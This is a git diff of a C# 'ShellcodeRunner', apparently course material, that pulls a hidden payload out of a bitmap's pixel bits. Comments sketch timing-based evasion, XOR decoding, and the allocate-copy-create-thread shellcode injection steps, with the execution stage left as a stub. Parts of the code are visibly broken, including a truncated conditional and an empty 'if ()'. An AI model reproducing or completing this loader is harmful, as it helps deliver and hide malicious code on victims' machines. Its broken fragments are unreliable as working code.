@@ -15,7 +15,7 @@ using System.Drawing;
  *      https://www.codeproject.com/Tips/635715/Steganography-Simple-Implementation-in-Csharp
 */
 
-namespace ShellcodeRunner
+namespace Module6_ShellcodeRunner
 {
     class Program
     {
@@ -71,7 +71,7 @@ namespace ShellcodeRunner
             return result;
         }
 
-        static void Main(string[] args)
+        public static void halp(string[] args)
         {
             // Dealing with HBD
             DateTime t1 = DateTime.Now;
@@ -123,89 +123,90 @@ namespace ShellcodeRunner
                         if (cui % 8 == 0)
                         {
                             charValue = reverseBits(charValue);
-                            if (charValue )
+                            // if (charValue
                         }
-                        if ((n+1) % 8 == 0)
+                        if ((n + 1) % 8 == 0)
+                        {
+                            data += Convert.ToChar(Convert.ToInt32(binstr, 2));
+                            binstr = "";
+                            if (pixel.ToArgb() % 2 != 0)
+                            {
+                                i = bmp.Width;
+                                break;
+                            }
+                        }
+                        if (pixel.ToArgb() % 2 == 0)
+                            binstr += "0";
+                        else
+                            binstr += "1";
+                        n++;
+                    }
+                }
+
+                /*int n = 0;
+                for (int i = 0; i < bmp.Width; i++)
+                {
+                    for (int j = 0; j < bmp.Height; j++)
                     {
-                        data += Convert.ToChar(Convert.ToInt32(binstr, 2));
-                        binstr = "";
-                        if (pixel.ToArgb() % 2 != 0)
+
+                        if (n >= lenth)
                         {
                             i = bmp.Width;
                             break;
                         }
-                    }
-                    if (pixel.ToArgb() % 2 == 0)
-                        binstr += "0";
-                    else
-                        binstr += "1";
-                    n++;
-                }
-            }
 
-            /*int n = 0;
-            for (int i = 0; i < bmp.Width; i++)
-            {
-                for (int j = 0; j < bmp.Height; j++)
+                        Color pixel = bmp.GetPixel(i, j);
+
+                        R = pixel.R - pixel.R % 2;
+                        G = pixel.G - pixel.G % 2;
+                        B = pixel.B - pixel.B % 2;
+                        int[] rgb = { R, G, B };
+
+                        pixels[n] = rgb;
+
+                        n++;
+
+                    }
+                }
+
+                int x = 0;
+                for (int a = 0; a < 3; a++)
                 {
-
-                    if (n >= lenth)
+                    for (int i = a; i < pixels.Length; i += 3)
                     {
-                        i = bmp.Width;
-                        break;
+                        if (x == 8)
+                        {
+                            if ()
+                            data += Convert.ToChar(Convert.ToInt32(binstr, 2));
+                            binstr = "";
+                            x = 0;
+                            continue;
+                        }
+                        if (i % 2 == 0)
+                            binstr += "0";
+                        else
+                            binstr += "1";
+                        x++;
                     }
+                }*/
+                //data = Convert.ToString(Convert.ToInt32(binstr, 2));
 
-                    Color pixel = bmp.GetPixel(i, j);
-                    
-                    R = pixel.R - pixel.R % 2;
-                    G = pixel.G - pixel.G % 2;
-                    B = pixel.B - pixel.B % 2;
-                    int[] rgb = { R, G, B };
+                luhmao = Encoding.ASCII.GetBytes(data);
+                System.Console.WriteLine(ByteArrayToString(luhmao));
 
-                    pixels[n] = rgb;
+                // Dealing with SBD
+                //luhmao = ecksore(luhmao);
 
-                    n++;
+                // Virtual alloc
+                // Copy bytes into buffer
+                // Create thread (Ex numa?)
 
-                }
-            }
-
-            int x = 0;
-            for (int a = 0; a < 3; a++)
-            {
-                for (int i = a; i < pixels.Length; i += 3)
+                if (mem != null)  // etc
                 {
-                    if (x == 8)
-                    {
-                        if ()
-                        data += Convert.ToChar(Convert.ToInt32(binstr, 2));
-                        binstr = "";
-                        x = 0;
-                        continue;
-                    }
-                    if (i % 2 == 0)
-                        binstr += "0";
-                    else
-                        binstr += "1";
-                    x++;
+                    // do your thing
                 }
-            }*/
-            //data = Convert.ToString(Convert.ToInt32(binstr, 2));
 
-            luhmao = Encoding.ASCII.GetBytes(data);
-            System.Console.WriteLine(ByteArrayToString(luhmao));
-
-            // Dealing with SBD
-            //luhmao = ecksore(luhmao);
-
-            // Virtual alloc
-            // Copy bytes into buffer
-            // Create thread (Ex numa?)
-
-            if (mem != null)  // etc
-            {
-                // do your thing
             }
-
         }
     }
 }
